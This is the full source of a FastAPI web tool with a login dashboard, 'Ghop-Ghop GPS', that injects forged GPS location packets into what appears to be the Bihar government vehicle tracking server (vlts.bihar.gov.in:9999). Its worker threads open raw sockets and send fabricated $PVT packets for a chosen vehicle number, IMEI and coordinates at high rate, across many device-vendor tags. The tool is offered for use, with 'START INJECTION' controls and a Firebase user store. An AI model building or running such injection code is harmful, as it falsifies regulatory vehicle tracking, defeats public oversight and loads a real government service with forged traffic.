import socket, threading, time, requests, json, asyncio
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, BackgroundTasks
from fastapi.responses import HTMLResponse
import httpx 

app = FastAPI()

# --- 🚀 CONFIG ---
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
stop_event = threading.Event()
stop_event.set()
total_sent = 0
lock = threading.Lock()

DEFAULT_TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

# --- 🏎️ TURBO ENGINE ---
def handshake_worker(tag, imei, vno, lat, lon):
    global total_sent
    try:
        lat_v, lon_v = float(lat), float(lon)
    except: return
    while not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2)
                s.connect(("vlts.bihar.gov.in", 9999))
                while not stop_event.is_set():
                    for _ in range(50): 
                        if stop_event.is_set(): break
                        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                        pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat_v:.6f},N,{lon_v:.6f},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*\\r\\n"
                        s.sendall(bytes(pkt, 'ascii'))
                        with lock: total_sent += 1
                        time.sleep(0.005)
                    time.sleep(0.05)
        except: time.sleep(0.5)

@app.get("/fetch_data")
async def fetch_data(vno: str):
    v_up = vno.upper().strip()
    async with httpx.AsyncClient() as client:
        try:
            r = await client.get(f"{DB_URL}/Data_Records/{v_up}.json")
            return r.json() or {"found": False}
        except: return {"found": False}

@app.get("/init")
async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
    global total_sent
    if stop_event.is_set():
        v_up, t_up = v.upper().strip(), t.upper().strip()
        try:
            lt_f, ln_f = float(lt), float(ln)
        except: return {"ok": False}
        total_sent = 0
        stop_event.clear()
        
        # 🔥 SERVER DATA UPDATE LOGIC
        now_ist = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        payload = {
            "Vehicle_No": v_up, 
            "IMEI_No": str(i), 
            "Lat": f"{lt_f:.7f}", 
            "Lon": f"{ln_f:.7f}", 
            "Saved_Tag": t_up, 
            "Status": "Active", 
            "Time": now_ist.strftime('%H:%M:%S')
        }
        
        # Background mein Firebase update karega
        background_tasks.add_task(update_firebase, v_up, t_up, payload)
        
        run_tags = list(DEFAULT_TAGS) if t_up == "ALL" else [t_up]
        for tag in list(set(run_tags)):
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt_f,ln_f), daemon=True).start()
    return {"ok": True}

async def update_firebase(vno, tag, payload):
    async with httpx.AsyncClient() as client:
        # Update Data_Records
        await client.put(f"{DB_URL}/Data_Records/{vno}.json", json=payload)
        # Agar naya tag hai toh Global_Tags mein add karo
        if tag != "ALL" and tag not in DEFAULT_TAGS:
            await client.put(f"{DB_URL}/Global_Tags/{tag}.json", json=True)

@app.get("/status")
def status(): return {"c": total_sent, "f": not stop_event.is_set()}

@app.get("/stop")
def stop(): stop_event.set(); return {"ok": True}

@app.get("/", response_class=HTMLResponse)
async def home():
    # ... (HTML content same as previous, ensured smartFetch and showDash work with priority)
    return """
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ghop-Ghop GPS</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
        .login-box, .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:20px; box-sizing: border-box; }
        .dashboard { display:none; }
        input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
        .chk-group { display: flex; align-items: center; justify-content: flex-start; gap: 10px; margin-top: 15px; width: 100%; color: #fff; font-size: 14px; padding-left: 5px; }
        .chk-group input[type="checkbox"] { width: 22px !important; height: 22px !important; margin: 0 !important; cursor: pointer; flex-shrink: 0; appearance: auto; }
        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; font-size:14px; border-radius:5px; }
        .user-wall { background:#001a00; border:1px solid #0f0; padding:10px; margin-top:10px; font-size:13px; display:none; color:red; border-radius:5px; width:100%; }
        #map { width:100%; height:250px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
        .nav { width:95%; max-width:440px; display:flex; justify-content:space-between; font-size:12px; margin-top:10px; color:#fff; }
    </style></head><body>
    <div class="login-box" id="loginScreen">
        <h1 style="text-align:center;font-size:24px;letter-spacing:5px;">Ghop-Ghop GPS</h1>
        <input type="text" id="m_num" placeholder="MOBILE NUMBER">
        <input type="password" id="m_pass" placeholder="PASSWORD">
        <div class="chk-group"><input type="checkbox" id="rem"> <label for="rem">Remember Me</label></div>
        <button onclick="login()" style="background:#0f0;color:#000;border:none;margin-top:20px;">ACCESS SYSTEM</button>
    </div>
    <div class="nav" id="dashNav" style="display:none;"><span>USER: <b id="u_name" style="color:#0f0"></b></span><span onclick="logout()" style="color:red;cursor:pointer;font-weight:bold;">[ LOGOUT ]</span></div>
    <div class="dashboard" id="dashScreen">
        <div class="user-wall" id="u_wall"></div>
        <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
        <input type="text" id="i" placeholder="IMEI">
        <select id="tagSel"><option value="ALL">SEND ALL TAGS (DEFAULT)</option></select>
        <div class="chk-group"><input type="checkbox" id="useDef" checked> <label for="useDef">Use Default Location (Profile)</label></div>
        <div style="display:flex;gap:5px;margin-top:10px;">
            <input type="text" id="lt" placeholder="LAT" oninput="updateMapManually()">
            <input type="text" id="ln" placeholder="LON" oninput="updateMapManually()">
        </div>
        <button onclick="getLocation()">[ GET CURRENT LOCATION ]</button>
        <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;border:none;">START INJECTION</button>
        <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
        <div id="map"></div>
        <div style="display:flex;justify-content:space-between;margin-top:15px;font-size:14px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
    </div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const DB = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com";
        const DEFAULT_TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"];
        let map, marker, curUser = null, mon = null;

        function initMap() { if (map) return; map = L.map('map').setView([25.29, 84.65], 13); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([25.29, 84.65]).addTo(map); }
        function updateMapManually() {
            let lat = parseFloat(document.getElementById('lt').value), lon = parseFloat(document.getElementById('ln').value);
            if(!isNaN(lat) && !isNaN(lon)) { map.setView([lat, lon], 14); marker.setLatLng([lat, lon]); }
        }
        async function login() {
            let n = document.getElementById('m_num').value.trim(), p = document.getElementById('m_pass').value.trim();
            let res = await fetch(`${DB}/users/${n}.json`), data = await res.json();
            if(data && data.password == p) { curUser = { ...data, mobile: n }; if(document.getElementById('rem').checked) localStorage.setItem('nitro_user', JSON.stringify(curUser)); showDash(); }
            else alert("WRONG PASSWORD");
        }
        window.onload = () => { let s = localStorage.getItem('nitro_user'); if(s){ curUser = JSON.parse(s); showDash(); } }
        async function showDash() {
            document.getElementById('loginScreen').style.display='none'; document.getElementById('dashScreen').style.display='block';
            document.getElementById('dashNav').style.display='flex'; document.getElementById('u_name').innerText=curUser.mobile;
            initMap();
            let wall = document.getElementById('u_wall');
            let bRes = await fetch(`${DB}/broadcast.json?t=${Date.now()}`), bData = await bRes.json();
            if(bData && bData.text) { wall.innerHTML = `● <b>ADMIN:</b> ${bData.text}`; wall.style.display = 'block'; }
            let sel = document.getElementById('tagSel');
            DEFAULT_TAGS.forEach(t => { let o = document.createElement('option'); o.value = t; o.innerText = t; sel.appendChild(o); });
        }
        async function smartFetch() {
            let v = document.getElementById('v').value.toUpperCase().trim();
            if(!v) return;
            let res = await fetch(`/fetch_data?vno=${v}`), d = await res.json();
            if(d.IMEI_No){
                document.getElementById('i').value = d.IMEI_No;
                let lat = document.getElementById('useDef').checked ? curUser.lat : (d.Lat || d.lat);
                let lon = document.getElementById('useDef').checked ? curUser.Lon : (d.Lon || d.lon);
                document.getElementById('lt').value = parseFloat(lat).toFixed(7);
                document.getElementById('ln').value = parseFloat(lon).toFixed(7);
                updateMapManually();
            }
        }
        function getLocation() {
            navigator.geolocation.getCurrentPosition(p=>{
                document.getElementById('lt').value = p.coords.latitude.toFixed(7);
                document.getElementById('ln').value = p.coords.longitude.toFixed(7);
                updateMapManually();
            }, null, {enableHighAccuracy:true});
        }
        function st() {
            let v=document.getElementById('v').value.trim(), i=document.getElementById('i').value.trim(), lt=document.getElementById('lt').value.trim(), ln=document.getElementById('ln').value.trim(), tag = document.getElementById('tagSel').value;
            if(!v || !i || !lt || !ln) return alert("FILL ALL!");
            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${tag}`);
            document.getElementById('st_text').innerText="FIRING";
            mon = setInterval(()=>{ fetch('/status').then(r=>r.json()).then(d=>{ document.getElementById('c').innerText=d.c; }); }, 1000);
        }
        function sp() { fetch('/stop'); if(mon) clearInterval(mon); document.getElementById('st_text').innerText="IDLE"; }
        function logout() { localStorage.removeItem('nitro_user'); location.reload(); }
    </script></body></html>
    """
